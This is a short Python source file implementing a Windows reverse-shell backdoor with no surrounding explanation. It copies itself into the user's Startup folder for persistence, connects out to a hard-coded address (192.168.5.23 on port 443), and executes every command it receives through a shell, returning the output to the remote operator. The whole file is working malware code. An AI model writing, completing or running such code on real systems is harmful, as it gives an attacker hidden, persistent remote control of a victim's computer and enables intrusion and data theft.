import socket
import subprocess
import os

def autorun() -> None:
    os.system(f'copy {os.path.abspath(__file__)} %APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')

def connect(ip: str, port: int) -> None:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((ip, port))

        return client
    except Exception as e:
        print(e)

def execute_command(client: socket.socket, command: str) -> None:
    try:
        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        client.send(process.stdout.read())
    except Exception as e:
        print(e)

def listen(client: socket.socket) -> None:
    while True:
        data = client.recv(1024).decode().strip()

        if data == '/exit':
            exit(0)
        else:
            execute_command(client, data)


if __name__ == '__main__':
    autorun()
    client = connect('192.168.5.23', 443)
    listen(client)